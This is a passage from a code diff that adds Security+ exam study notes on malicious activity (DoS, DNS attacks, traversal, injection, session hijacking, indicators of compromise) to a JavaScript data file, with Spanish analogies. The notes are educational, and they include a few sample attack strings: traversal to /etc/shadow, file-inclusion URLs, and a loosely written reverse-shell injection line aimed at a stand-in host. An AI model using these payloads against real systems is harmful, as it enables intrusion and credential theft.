@@ -11253,5 +11253,3807 @@ const STUDY_DATA = [
         "raw_content": "* **Definition:** A condition where two or more processes are each waiting for the other to release a locked resource, creating a circular dependency that prevents any progress until external intervention removes the lock.\n\nDeadlocks are a side effect of improper mutex/lock design. Proper testing of lock logic is essential to prevent them."
       }
     ]
+  },
+  {
+    "sectionId": "S19",
+    "sectionTitle": "Section 19: Malicious Activity",
+    "concepts": [
+      {
+        "name": "Malicious Activity — Overview",
+        "definition": "A broad category of cyber threats where attackers use various techniques to disrupt systems, steal data, or gain unauthorized access to resources.",
+        "analogy": "*Es como estudiar todos los tipos de delitos antes de convertirte en detective. Si no sabes cómo opera un ladrón, un estafador o un vandalo, no puedes atraparlos ni proteger a nadie de ellos.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A broad category of cyber threats where attackers use various techniques to disrupt systems, steal data, or gain unauthorized access to resources.\n\nMalicious activity spans a wide range of attack types, each with distinct mechanisms and impacts. Understanding these attacks — including their **tactics, techniques, and procedures (TTPs)** — is the foundation of effective defense. This section maps to **Security+ Objective 2.4**: given a scenario, analyze indicators of malicious activity.\n\n> *Es como estudiar todos los tipos de delitos antes de convertirte en detective. Si no sabes cómo opera un ladrón, un estafador o un vandalo, no puedes atraparlos ni proteger a nadie de ellos.*\n\n---"
+      },
+      {
+        "name": "Denial of Service (DoS)",
+        "definition": "An attack category that attempts to make a computer, server, or network device unavailable to its intended users by overwhelming it with requests or exploiting vulnerabilities.",
+        "analogy": "*Es como bloquear la entrada de un restaurante con cientos de personas falsas que no van a ordenar nada — los clientes reales no pueden entrar.*",
+        "tables": [
+          {
+            "headers": [
+              "Countermeasure",
+              "How it helps"
+            ],
+            "rows": [
+              [
+                "**Flood guards**",
+                "Detect and block SYN floods at the network boundary"
+              ],
+              [
+                "**Session timeout**",
+                "Server times out half-open connections after 10–30 seconds"
+              ],
+              [
+                "**IPS**",
+                "Detects and responds to SYN floods in progress"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** An attack category that attempts to make a computer, server, or network device unavailable to its intended users by overwhelming it with requests or exploiting vulnerabilities.\n\nDoS is not a single attack but a **category** of attacks. The goal is always the same: deny legitimate users access to a service.\n\n> *Es como bloquear la entrada de un restaurante con cientos de personas falsas que no van a ordenar nada — los clientes reales no pueden entrar.*\n\n### DoS: Flood Attacks\n\n* **Definition:** A DoS subtype that attempts to send more packets to a single server or host than it can handle, exhausting its resources.\n\n**Ping Flood** — floods a target with ICMP echo request packets. Countermeasure: configure firewalls to drop ICMP echo replies.\n\n**SYN Flood** — attacker initiates many TCP sessions using spoofed IP addresses but never completes the three-way handshake, leaving the server waiting with reserved resources until they run out.\n\n| Countermeasure | How it helps |\n|---|---|\n| **Flood guards** | Detect and block SYN floods at the network boundary |\n| **Session timeout** | Server times out half-open connections after 10–30 seconds |\n| **IPS** | Detects and responds to SYN floods in progress |\n\n### DoS: Permanent Denial of Service (PDoS)\n\n* **Definition:** An attack that permanently damages a networking device by overwriting or corrupting its firmware, requiring a full hardware reload to recover.\n\nAlso called **phlashing**. A simple reboot will not restore the device because the OS/firmware itself has been destroyed.\n\n> *Como quemar el libro de instrucciones de una máquina — no es que esté apagada, es que ya no sabe cómo encenderse.*\n\n### DoS: Fork Bomb\n\n* **Definition:** A DoS attack that creates a rapidly self-replicating number of processes to exhaust a system's CPU and memory resources.\n\n⚠️ A fork bomb is **not a worm** — it does not spread across the network or infect other programs. It only spreads within the processor's cache of the targeted machine.\n\n---"
+      },
+      {
+        "name": "Distributed Denial of Service (DDoS)",
+        "definition": "A DoS attack that uses hundreds or thousands of compromised machines (a botnet) to simultaneously flood a single target, making it far more difficult to stop than a single-source attack.",
+        "analogy": "*Es como si un jefe del crimen controlara miles de personas en diferentes ciudades y les diera la orden de llamar al mismo número de teléfono al mismo tiempo — la línea colapsa y nadie más puede comunicarse.*",
+        "tables": [
+          {
+            "headers": [
+              "Strategy",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**Blackholing / Sinkholing**",
+                "Routes attacking IPs to a null interface; temporary fix since attackers can change IPs"
+              ],
+              [
+                "**IPS**",
+                "Effective for small-scale attacks; insufficient for large DDoS"
+              ],
+              [
+                "**Elastic cloud infrastructure**",
+                "Scales up to absorb attack traffic; can be costly due to increased usage billing"
+              ],
+              [
+                "**Specialized CDN providers**",
+                "CloudFlare, Akamai — purpose-built for DDoS absorption and content distribution"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A DoS attack that uses hundreds or thousands of compromised machines (a botnet) to simultaneously flood a single target, making it far more difficult to stop than a single-source attack.\n\nIndividual machines in the botnet (**zombies** or **bots**) typically don't know they're participating. They receive a command from a controller and all send packets to the victim simultaneously.\n\n> *Es como si un jefe del crimen controlara miles de personas en diferentes ciudades y les diera la orden de llamar al mismo número de teléfono al mismo tiempo — la línea colapsa y nadie más puede comunicarse.*\n\n### DDoS: DNS Amplification Attack\n\n* **Definition:** A specialized DDoS where the attacker sends small DNS queries with the victim's spoofed IP address to open DNS servers, which reply with large responses — flooding the victim with amplified traffic.\n\nThe attack leverages the **size asymmetry** between a small DNS query and a large DNS response. Combined with a botnet, this generates massive traffic volumes quickly.\n\n### DDoS Mitigation Strategies\n\n| Strategy | Description |\n|---|---|\n| **Blackholing / Sinkholing** | Routes attacking IPs to a null interface; temporary fix since attackers can change IPs |\n| **IPS** | Effective for small-scale attacks; insufficient for large DDoS |\n| **Elastic cloud infrastructure** | Scales up to absorb attack traffic; can be costly due to increased usage billing |\n| **Specialized CDN providers** | CloudFlare, Akamai — purpose-built for DDoS absorption and content distribution |\n\n---"
+      },
+      {
+        "name": "DNS Attacks",
+        "definition": "A category of attacks that target the Domain Name System to disrupt services, redirect traffic to malicious destinations, or expose network infrastructure information.",
+        "analogy": "*El DNS es como la guía telefónica de internet. Si alguien la falsifica, envenena o roba, puede redirigir a todas las personas al lugar equivocado sin que se den cuenta.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A category of attacks that target the Domain Name System to disrupt services, redirect traffic to malicious destinations, or expose network infrastructure information.\n\nDNS is a critical internet component and a prime attack surface. There are five main DNS attack types to know.\n\n> *El DNS es como la guía telefónica de internet. Si alguien la falsifica, envenena o roba, puede redirigir a todas las personas al lugar equivocado sin que se den cuenta.*\n\n### DNS: Cache Poisoning\n\n* **Definition:** An attack that corrupts a DNS resolver's cache with false records, redirecting users to attacker-controlled IP addresses instead of the legitimate destination. Also called DNS spoofing.\n\n**Mitigation:** Use **DNSSEC** (DNS Security Extensions) to add digital signatures to DNS records, verifying authenticity and integrity during lookups.\n\n### DNS: Amplification Attack\n\n* **Definition:** A DDoS-style attack where the attacker sends small DNS queries with the victim's spoofed IP to open resolvers, which send large responses to the victim, overwhelming it with traffic.\n\n**Mitigation:** Rate-limit DNS response traffic and limit the size of DNS responses.\n\n### DNS: Tunneling\n\n* **Definition:** An attack technique that encapsulates non-DNS traffic (such as HTTP or SSH) inside DNS queries and responses over port 53 to bypass firewall rules for command-and-control (C2) or data exfiltration.\n\nDNS traffic is often allowed through firewalls without inspection, making this technique effective. DNS tunneling is a legitimate protocol feature that attackers exploit.\n\n**Mitigation:** Monitor and analyze DNS logs for unusual patterns such as abnormally long queries, high query frequency, or unusual domain names.\n\n### DNS: Domain Hijacking\n\n* **Definition:** An attack where the registration of a domain name is changed without the permission of the legitimate registrant, giving the attacker control over the domain and its traffic. Also called domain theft.\n\n**Mitigation:** Use **domain registry lock services** to prevent unauthorized changes; regularly update and secure registrar account credentials.\n\n### DNS: Zone Transfer Attack\n\n* **Definition:** An attack where the attacker impersonates an authorized system to request a full copy of a DNS zone file, exposing all DNS records and network infrastructure details for use in future reconnaissance.\n\n⚠️ Zone transfer data reveals the full map of a network's DNS structure — a goldmine for pre-attack reconnaissance.\n\n---"
+      },
+      {
+        "name": "Directory Traversal Attack",
+        "definition": "An injection attack that exploits insufficient input validation in a web application to access files and directories outside the intended web document root, potentially reaching sensitive system files.",
+        "analogy": "*Es como estar en un hotel y descubrir que, en vez de usar el elevador normal, puedes subir por las escaleras de servicio y entrar a cualquier habitación — incluyendo la oficina del gerente donde están las llaves maestras.*",
+        "tables": [],
+        "list_items": [
+          "`../` can be encoded as `%2e%2e%2f`"
+        ],
+        "raw_content": "* **Definition:** An injection attack that exploits insufficient input validation in a web application to access files and directories outside the intended web document root, potentially reaching sensitive system files.\n\nAlso called a **path traversal** attack. If a web server runs on Linux, the attack uses `../` sequences in a URL to navigate up the directory tree. On Windows/IIS systems, `..\\ ` (backslash) is used, though Windows often accepts both.\n\n> *Es como estar en un hotel y descubrir que, en vez de usar el elevador normal, puedes subir por las escaleras de servicio y entrar a cualquier habitación — incluyendo la oficina del gerente donde están las llaves maestras.*\n\n**Example URL:**\n```\nhttps://diontraining.com/../../../../etc/shadow\n```\nEach `../` moves one level up the directory tree until reaching the system root, then navigates to the `/etc/shadow` file containing Linux password hashes.\n\n⚠️ Attackers may **encode** traversal sequences to bypass security filters:\n- `../` can be encoded as `%2e%2e%2f`\n\n### Directory Traversal: File Inclusion\n\n* **Definition:** A web application vulnerability that allows an attacker to either download arbitrary files from the host system (via directory traversal) or upload and execute malicious scripts to establish a backdoor.\n\n**Remote File Inclusion (RFI)** — attacker injects a URL pointing to a remote malicious script as a parameter value, causing the server to fetch and execute the attacker's code.\n\n```\nhttps://diontraining.com/login.php?user=http://malware.bad/malicious.php\n```\n\n**Local File Inclusion (LFI)** — attacker references a file already on the server (e.g., a previously uploaded file) and uses directory traversal to execute it.\n\n```\nhttps://diontraining.com/login.php?user=../../Windows/system32/cmd.exe%00\n```\nThe `%00` is a **null byte** that terminates the string, bypassing filters that would otherwise append `.php` to the request.\n\n⚠️ **Exam tip:** Anytime you see `../` in a URL or log — think **directory traversal**. If the answer choices include both \"directory traversal\" and \"local file inclusion,\" LFI is a subtype of directory traversal.\n\n---"
+      },
+      {
+        "name": "Execution and Escalation Attacks",
+        "definition": "A class of attacks that exploit vulnerabilities to run unauthorized code on a system, or to gain higher levels of system privilege than originally granted.",
+        "analogy": "*Es como entrar a un edificio con un pase de visitante y, usando trucos, conseguir la llave maestra que abre todos los pisos — incluyendo el de servidores en el sótano.*",
+        "tables": [
+          {
+            "headers": [
+              "Type",
+              "Description",
+              "Example"
+            ],
+            "rows": [
+              [
+                "**Vertical Privilege Escalation**",
+                "Moving from a lower-privilege user to a higher-privilege level (user → admin/root)",
+                "Clicking a phishing link that runs code granting local admin rights"
+              ],
+              [
+                "**Horizontal Privilege Escalation**",
+                "Accessing resources of another user at the same privilege level",
+                "Exploiting a vulnerability to read or modify George's files without his permission"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Ring",
+              "Level",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**Ring 0**",
+                "Kernel mode",
+                "Most privileged; full control over the OS"
+              ],
+              [
+                "**Ring 1–2**",
+                "Driver mode",
+                "Device driver level access"
+              ],
+              [
+                "**Ring 3**",
+                "User mode",
+                "Application level; least privileged"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A class of attacks that exploit vulnerabilities to run unauthorized code on a system, or to gain higher levels of system privilege than originally granted.\n\n> *Es como entrar a un edificio con un pase de visitante y, usando trucos, conseguir la llave maestra que abre todos los pisos — incluyendo el de servidores en el sótano.*\n\n### Arbitrary Code Execution (ACE)\n\n* **Definition:** A vulnerability that allows an attacker to run any code they choose on a target system by exploiting a flaw in an application or process.\n\n### Remote Code Execution (RCE)\n\n* **Definition:** A subtype of arbitrary code execution where the attacker transmits and executes malicious code on a target system from a remote host over a network.\n\n⚠️ **ACE vs RCE:** ACE = attacker can run code on the machine (any vector, touching the target machine). RCE = ACE done **remotely** over the internet. RCE is a specific, more dangerous subset of ACE.\n\n### Privilege Escalation\n\n* **Definition:** An attack where a user or process gains access to resources or permissions beyond what they are normally entitled to, typically aiming for administrator or root-level access.\n\n| Type | Description | Example |\n|---|---|---|\n| **Vertical Privilege Escalation** | Moving from a lower-privilege user to a higher-privilege level (user → admin/root) | Clicking a phishing link that runs code granting local admin rights |\n| **Horizontal Privilege Escalation** | Accessing resources of another user at the same privilege level | Exploiting a vulnerability to read or modify George's files without his permission |\n\nEvery process runs under some account's privileges. Code injected into a process **inherits the privileges of that process** — making high-privilege processes prime targets.\n\n### Rootkits\n\n* **Definition:** A class of malware that modifies system files — often at the kernel level — to conceal its presence and maintain persistent, stealthy access to a compromised system.\n\nRootkits are difficult to detect because they can hide themselves, install additional malware, and maintain persistence across reboots and user logoffs.\n\nRootkits operate at different privilege **rings**:\n\n| Ring | Level | Description |\n|---|---|---|\n| **Ring 0** | Kernel mode | Most privileged; full control over the OS |\n| **Ring 1–2** | Driver mode | Device driver level access |\n| **Ring 3** | User mode | Application level; least privileged |\n\n**Kernel mode rootkit** — embeds at Ring 0; complete system control; most dangerous.\n\n**User mode rootkit** — operates at Ring 3 with admin-level privileges; uses OS features (registry, Task Scheduler) for persistence; easier to detect and remove.\n\n---"
+      },
+      {
+        "name": "Replay Attacks",
+        "definition": "A network attack where a valid data transmission (such as authentication credentials) is intercepted and then maliciously retransmitted later to gain unauthorized access.",
+        "analogy": "*Es como grabar la combinación que alguien marca en una caja fuerte y luego, cuando se va, marcar tú mismo la misma combinación para abrirla — sin necesidad de saber qué número es cada tono.*",
+        "tables": [
+          {
+            "headers": [
+              "Mitigation",
+              "How it helps"
+            ],
+            "rows": [
+              [
+                "**Session tokens**",
+                "Unique per-session tokens make replaying an old session invalid"
+              ],
+              [
+                "**Multi-Factor Authentication (MFA)**",
+                "OTP codes expire every 30–60 seconds; captured codes cannot be reused"
+              ],
+              [
+                "**WPA3**",
+                "Modern Wi-Fi encryption protocol resistant to replay attacks"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A network attack where a valid data transmission (such as authentication credentials) is intercepted and then maliciously retransmitted later to gain unauthorized access.\n\nThe attacker does not need to crack or decrypt the captured data — they simply **replay** the original valid session to the server, which accepts it as legitimate.\n\n> *Es como grabar la combinación que alguien marca en una caja fuerte y luego, cuando se va, marcar tú mismo la misma combinación para abrirla — sin necesidad de saber qué número es cada tono.*\n\n**Example:** An attacker captures your bank login session and replays it hours later to authenticate as you.\n\n| Mitigation | How it helps |\n|---|---|\n| **Session tokens** | Unique per-session tokens make replaying an old session invalid |\n| **Multi-Factor Authentication (MFA)** | OTP codes expire every 30–60 seconds; captured codes cannot be reused |\n| **WPA3** | Modern Wi-Fi encryption protocol resistant to replay attacks |\n\n⚠️ **Replay vs Session Hijacking:** In a replay attack the attacker retransmits captured data later. In session hijacking the attacker modifies data in real time during an active session.\n\n---"
+      },
+      {
+        "name": "Session Hijacking",
+        "definition": "A spoofing attack where the attacker steals or forges a user's active session token (often via cookie theft) to impersonate that user and take over their authenticated session.",
+        "analogy": "*Es como robarle el brazalete de acceso a alguien en un festival de música. Nadie en la entrada sabe quién eres — solo ven el brazalete y te dejan pasar.*",
+        "tables": [
+          {
+            "headers": [
+              "Type",
+              "Storage",
+              "Lifespan"
+            ],
+            "rows": [
+              [
+                "**Session cookies**",
+                "Memory only",
+                "Deleted when browser closes"
+              ],
+              [
+                "**Persistent cookies**",
+                "Browser cache",
+                "Until manually cleared or expiration date"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "Encrypt cookies during transmission and storage",
+          "Validate all cookie input server-side",
+          "Delete cookies when the session ends",
+          "Set strict expiration times"
+        ],
+        "raw_content": "* **Definition:** A spoofing attack where the attacker steals or forges a user's active session token (often via cookie theft) to impersonate that user and take over their authenticated session.\n\nHTTP is a **stateless protocol** — servers don't remember clients between requests. **Cookies** solve this by storing session state. Because cookies are transmitted with every request, stealing them allows an attacker to impersonate the legitimate user.\n\n> *Es como robarle el brazalete de acceso a alguien en un festival de música. Nadie en la entrada sabe quién eres — solo ven el brazalete y te dejan pasar.*\n\n**Cookie types:**\n\n| Type | Storage | Lifespan |\n|---|---|---|\n| **Session cookies** | Memory only | Deleted when browser closes |\n| **Persistent cookies** | Browser cache | Until manually cleared or expiration date |\n\n### Session Hijacking: Session Prediction\n\n* **Definition:** A session hijacking technique where the attacker attempts to predict the next valid session token by analyzing patterns in how tokens are generated, then uses the predicted token to take over a session.\n\nTokens must be generated by a **non-predictable algorithm** and must not reveal any information about the client or session.\n\n### Session Hijacking: Cookie Poisoning\n\n* **Definition:** An attack where the contents of a cookie are modified after it has been issued by the web server, exploiting the altered values to trigger vulnerabilities in the web application.\n\n**Mitigations for cookie security:**\n- Encrypt cookies during transmission and storage\n- Validate all cookie input server-side\n- Delete cookies when the session ends\n- Set strict expiration times\n\n---"
+      },
+      {
+        "name": "On-Path Attacks",
+        "definition": "An attack where the attacker positions themselves logically between two communicating hosts to transparently capture, monitor, and optionally modify or relay the traffic between them. Formerly called Man-in-the-Middle (MitM).",
+        "analogy": "*Es como un cartero corrupto que abre todas tus cartas antes de entregarlas, lee el contenido, puede modificarlo, y luego las sella de nuevo como si nada hubiera pasado.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** An attack where the attacker positions themselves logically between two communicating hosts to transparently capture, monitor, and optionally modify or relay the traffic between them. Formerly called Man-in-the-Middle (MitM).\n\nCommon methods to achieve an on-path position include: **ARP poisoning**, **DNS poisoning**, rogue wireless access points, and rogue hub/switches.\n\n> *Es como un cartero corrupto que abre todas tus cartas antes de entregarlas, lee el contenido, puede modificarlo, y luego las sella de nuevo como si nada hubiera pasado.*\n\n**Replay** (in on-path context) — attacker captures valid data and retransmits it immediately or after a delay to authenticate to a service.\n\n**Relay** — attacker inserts themselves as a transparent proxy between client and server, reading and optionally modifying all traffic in real time.\n\n### On-Path: SSL Stripping\n\n* **Definition:** An on-path technique that downgrades a victim's HTTPS connection to plain HTTP by intercepting the initial request and presenting the client with an unencrypted connection, allowing the attacker to read all traffic in cleartext.\n\nThe victim's browser shows no padlock and the communication is unencrypted, enabling full data interception.\n\n### On-Path: Downgrade Attack\n\n* **Definition:** An on-path technique that forces a client or server to negotiate a lower, weaker security protocol version (e.g., SSL 2.0 instead of TLS 1.3), making it easier for the attacker to decrypt or crack the intercepted traffic.\n\n⚠️ Downgrade attacks apply beyond SSL/TLS — they can target any negotiated security protocol including Wi-Fi and VPNs. The key is exploiting **backwards compatibility** between protocol versions.\n\n---"
+      },
+      {
+        "name": "Injection Attacks",
+        "definition": "A broad class of attacks where an attacker inserts malicious input through an application interface, causing the application to execute unintended commands or queries.",
+        "analogy": "*Es como escribir instrucciones falsas en un formulario oficial — si el sistema no valida lo que recibe, ejecuta tus órdenes como si fueran legítimas.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A broad class of attacks where an attacker inserts malicious input through an application interface, causing the application to execute unintended commands or queries.\n\n> *Es como escribir instrucciones falsas en un formulario oficial — si el sistema no valida lo que recibe, ejecuta tus órdenes como si fueran legítimas.*\n\n### Injection: LDAP Injection\n\n* **Definition:** An application attack that targets web applications using LDAP (Lightweight Directory Access Protocol) by injecting malicious LDAP queries through user input fields to manipulate directory lookups, bypass authentication, or expose directory data.\n\nLDAP is commonly used for authentication and storing user/group information. Injecting a wildcard (`*`) into an unsanitized LDAP query can return all users in the directory.\n\n**Mitigation:** Input validation and input sanitization — same principle as SQL injection prevention.\n\n### Injection: Command Injection\n\n* **Definition:** An attack where a threat actor appends shell commands to user-supplied input in a vulnerable web application, causing the server to execute those commands with the web server's own privileges.\n\n**Example:** A web app accepts an IP address and runs `ping [input]`. If an attacker enters:\n```\ndiontraining.com && /bin/sh -i nc hacked.diontraining.com 443\n```\nThe server executes both the ping AND opens a reverse shell to the attacker.\n\n**Mitigation:** Strict input validation — only accept the expected format (e.g., valid IP addresses or domain names) and reject or strip anything else.\n\n### Injection: Process Injection\n\n* **Definition:** A technique where an attacker executes arbitrary code within the memory space of a legitimate, already-running process to inherit that process's permissions and evade security detection.\n\nBecause the malicious code runs **under a trusted process**, security tools may not flag it. Execution is masked as normal process activity.\n\nCommon process injection methods include: DLL injection, thread execution hijacking, process hollowing, process doppelgänging, asynchronous procedure calls (APC), and portable execution (PE) injection.\n\n**Mitigation:** Endpoint security solutions blocking common attack sequences, security kernel modules, and the principle of **least privilege**.\n\n---"
+      },
+      {
+        "name": "Indicators of Compromise (IoC)",
+        "definition": "Pieces of forensic data that identify potentially malicious activity on a network or system, serving as digital evidence that a security breach may have occurred.",
+        "analogy": "*Son como las huellas de barro en el pasillo de un museo después de que cierra. No confirman que alguien robó algo — pero definitivamente indican que hay que investigar quién entró y por qué.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** Pieces of forensic data that identify potentially malicious activity on a network or system, serving as digital evidence that a security breach may have occurred.\n\nIoCs are clues, not proof. A detected IoC requires investigation to determine whether it represents a true compromise, a system error, legitimate user activity, or a false positive.\n\n> *Son como las huellas de barro en el pasillo de un museo después de que cierra. No confirman que alguien robó algo — pero definitivamente indican que hay que investigar quién entró y por qué.*\n\n### IoC: Account Lockouts\n\n* **Definition:** An IoC that occurs when an account is locked after multiple failed login attempts, potentially indicating a brute force attack attempting to guess credentials.\n\nLockout policies balance security and usability — too strict (e.g., 3 attempts) causes false positives for legitimate users who mistype. Some systems auto-unlock after a timeout; high-security systems require manual admin intervention.\n\n### IoC: Concurrent Session Usage\n\n* **Definition:** An IoC where multiple active sessions exist simultaneously for a single user account, potentially indicating the account has been compromised and is being used by both the legitimate user and an attacker.\n\n⚠️ Could be a false positive (e.g., user logged in from phone and laptop). Becomes highly suspicious when combined with **impossible travel** — one session in the US, another in Europe at the same time.\n\n### IoC: Blocked Content\n\n* **Definition:** An IoC consisting of repeated attempts to access or download content that has been blocked by security controls, potentially indicating a compromised account being used for data exfiltration or malware download.\n\n### IoC: Impossible Travel\n\n* **Definition:** An IoC that flags authentication events from geographically distant locations within a timeframe that makes physical travel between those locations impossible, strongly indicating credential compromise.\n\n**Example:** Login from New York at 9:00 AM, then login from London at 10:00 AM. A transatlantic flight takes 6+ hours — this is physically impossible.\n\n⚠️ Often appears together with concurrent session usage as both can occur simultaneously during an active account compromise.\n\n### IoC: Resource Consumption\n\n* **Definition:** An IoC characterized by unusual spikes in CPU, memory, GPU, or network bandwidth utilization, potentially indicating malware infection, DDoS participation, or cryptomining activity.\n\n**Example:** A server normally at 20% CPU suddenly jumps to 90%. A workstation with 90% GPU usage while browsing may be enrolled as a **crypto mining zombie**.\n\n### IoC: Resource Inaccessibility\n\n* **Definition:** An IoC where users suddenly cannot access files, databases, or network services — commonly associated with ransomware attacks that encrypt victim data and demand payment for decryption.\n\nThe clearest sign: users receive a **ransom note** alongside inaccessible files.\n\n### IoC: Out-of-Cycle Logging\n\n* **Definition:** An IoC consisting of log entries at unusual times (late nights, weekends, holidays) when no legitimate activity is expected, potentially indicating an attacker operating during off-hours to avoid detection.\n\n**Example:** Log activity at 3:00 AM in an office that closes at 6:00 PM.\n\n### IoC: Missing Logs\n\n* **Definition:** An IoC where system logs show unexplained gaps of hours or days, potentially indicating an attacker has deleted log entries to erase evidence of their activity and impede forensic investigation.\n\n⚠️ Attackers routinely delete logs as a **covering tracks** technique. Missing logs are itself strong evidence something malicious occurred.\n\n### IoC: Published/Defacement Notifications\n\n* **Definition:** An IoC where an attacker publicly announces or demonstrates that they have compromised an organization's systems — through website defacement, social media posts, hacker forums, or news articles.\n\n**Example:** A company's homepage is replaced with a message from a hacktivist group claiming responsibility for the breach.\n\n---"
+      },
+      {
+        "name": "Key Terms Glossary",
+        "definition": "DoS: Denial of Service — attack making a system unavailable to legitimate users",
+        "analogy": "",
+        "tables": [
+          {
+            "headers": [
+              "Term",
+              "Definition"
+            ],
+            "rows": [
+              [
+                "**DoS**",
+                "Denial of Service — attack making a system unavailable to legitimate users"
+              ],
+              [
+                "**DDoS**",
+                "Distributed DoS — same goal but using hundreds/thousands of compromised machines"
+              ],
+              [
+                "**Botnet**",
+                "Network of compromised machines (zombies/bots) controlled by an attacker"
+              ],
+              [
+                "**SYN Flood**",
+                "DoS using incomplete TCP handshakes to exhaust server resources"
+              ],
+              [
+                "**PDoS**",
+                "Permanent DoS — overwrites device firmware; requires full hardware restoration"
+              ],
+              [
+                "**Fork Bomb**",
+                "DoS via explosive process self-replication within a single machine's CPU"
+              ],
+              [
+                "**Blackholing**",
+                "Routing attacker IPs to a null interface to stop DDoS traffic"
+              ],
+              [
+                "**DNS Cache Poisoning**",
+                "Corrupting DNS resolver cache to redirect users to attacker-controlled sites"
+              ],
+              [
+                "**DNSSEC**",
+                "DNS Security Extensions — adds digital signatures to DNS records"
+              ],
+              [
+                "**DNS Tunneling**",
+                "Encapsulating non-DNS traffic in DNS queries to bypass firewall rules"
+              ],
+              [
+                "**Domain Hijacking**",
+                "Unauthorized takeover of a domain's registration"
+              ],
+              [
+                "**Zone Transfer Attack**",
+                "Stealing the full DNS zone file for network reconnaissance"
+              ],
+              [
+                "**Directory Traversal**",
+                "Using `../` sequences to access files outside the web root"
+              ],
+              [
+                "**RFI**",
+                "Remote File Inclusion — injecting a remote malicious script via URL parameter"
+              ],
+              [
+                "**LFI**",
+                "Local File Inclusion — executing an already-uploaded file via directory traversal"
+              ],
+              [
+                "**ACE**",
+                "Arbitrary Code Execution — running attacker-chosen code on a target system"
+              ],
+              [
+                "**RCE**",
+                "Remote Code Execution — ACE performed remotely over a network"
+              ],
+              [
+                "**Privilege Escalation**",
+                "Gaining permissions beyond what was originally granted"
+              ],
+              [
+                "**Vertical Escalation**",
+                "User → admin/root level privilege gain"
+              ],
+              [
+                "**Horizontal Escalation**",
+                "Gaining access to another user's resources at the same privilege level"
+              ],
+              [
+                "**Rootkit**",
+                "Malware that hides at kernel or user level for persistent stealthy access"
+              ],
+              [
+                "**Kernel Mode Rootkit**",
+                "Ring 0 rootkit with complete system control — most dangerous"
+              ],
+              [
+                "**User Mode Rootkit**",
+                "Ring 3 rootkit using OS features (registry, scheduler) for persistence"
+              ],
+              [
+                "**Replay Attack**",
+                "Capturing and retransmitting a valid session to gain unauthorized access"
+              ],
+              [
+                "**Session Hijacking**",
+                "Stealing or forging a session token to impersonate an authenticated user"
+              ],
+              [
+                "**Cookie Poisoning**",
+                "Modifying cookie contents to exploit web application vulnerabilities"
+              ],
+              [
+                "**Session Prediction**",
+                "Guessing future session tokens by analyzing token generation patterns"
+              ],
+              [
+                "**On-Path Attack**",
+                "Interposing between two hosts to capture, relay, or modify traffic (formerly MitM)"
+              ],
+              [
+                "**SSL Stripping**",
+                "Downgrading HTTPS to HTTP to intercept unencrypted traffic"
+              ],
+              [
+                "**Downgrade Attack**",
+                "Forcing negotiation to a weaker security protocol version"
+              ],
+              [
+                "**LDAP Injection**",
+                "Injecting malicious LDAP queries via unsanitized user input"
+              ],
+              [
+                "**Command Injection**",
+                "Appending shell commands to web app input to execute on the server"
+              ],
+              [
+                "**Process Injection**",
+                "Executing code within a legitimate process's memory space"
+              ],
+              [
+                "**IoC**",
+                "Indicator of Compromise — forensic clue suggesting a potential breach"
+              ],
+              [
+                "**Impossible Travel**",
+                "Logins from geographically incompatible locations within an impossible timeframe"
+              ],
+              [
+                "**Out-of-Cycle Logging**",
+                "Log activity at abnormal hours suggesting covert attacker operations"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "| Term | Definition |\n|---|---|\n| **DoS** | Denial of Service — attack making a system unavailable to legitimate users |\n| **DDoS** | Distributed DoS — same goal but using hundreds/thousands of compromised machines |\n| **Botnet** | Network of compromised machines (zombies/bots) controlled by an attacker |\n| **SYN Flood** | DoS using incomplete TCP handshakes to exhaust server resources |\n| **PDoS** | Permanent DoS — overwrites device firmware; requires full hardware restoration |\n| **Fork Bomb** | DoS via explosive process self-replication within a single machine's CPU |\n| **Blackholing** | Routing attacker IPs to a null interface to stop DDoS traffic |\n| **DNS Cache Poisoning** | Corrupting DNS resolver cache to redirect users to attacker-controlled sites |\n| **DNSSEC** | DNS Security Extensions — adds digital signatures to DNS records |\n| **DNS Tunneling** | Encapsulating non-DNS traffic in DNS queries to bypass firewall rules |\n| **Domain Hijacking** | Unauthorized takeover of a domain's registration |\n| **Zone Transfer Attack** | Stealing the full DNS zone file for network reconnaissance |\n| **Directory Traversal** | Using `../` sequences to access files outside the web root |\n| **RFI** | Remote File Inclusion — injecting a remote malicious script via URL parameter |\n| **LFI** | Local File Inclusion — executing an already-uploaded file via directory traversal |\n| **ACE** | Arbitrary Code Execution — running attacker-chosen code on a target system |\n| **RCE** | Remote Code Execution — ACE performed remotely over a network |\n| **Privilege Escalation** | Gaining permissions beyond what was originally granted |\n| **Vertical Escalation** | User → admin/root level privilege gain |\n| **Horizontal Escalation** | Gaining access to another user's resources at the same privilege level |\n| **Rootkit** | Malware that hides at kernel or user level for persistent stealthy access |\n| **Kernel Mode Rootkit** | Ring 0 rootkit with complete system control — most dangerous |\n| **User Mode Rootkit** | Ring 3 rootkit using OS features (registry, scheduler) for persistence |\n| **Replay Attack** | Capturing and retransmitting a valid session to gain unauthorized access |\n| **Session Hijacking** | Stealing or forging a session token to impersonate an authenticated user |\n| **Cookie Poisoning** | Modifying cookie contents to exploit web application vulnerabilities |\n| **Session Prediction** | Guessing future session tokens by analyzing token generation patterns |\n| **On-Path Attack** | Interposing between two hosts to capture, relay, or modify traffic (formerly MitM) |\n| **SSL Stripping** | Downgrading HTTPS to HTTP to intercept unencrypted traffic |\n| **Downgrade Attack** | Forcing negotiation to a weaker security protocol version |\n| **LDAP Injection** | Injecting malicious LDAP queries via unsanitized user input |\n| **Command Injection** | Appending shell commands to web app input to execute on the server |\n| **Process Injection** | Executing code within a legitimate process's memory space |\n| **IoC** | 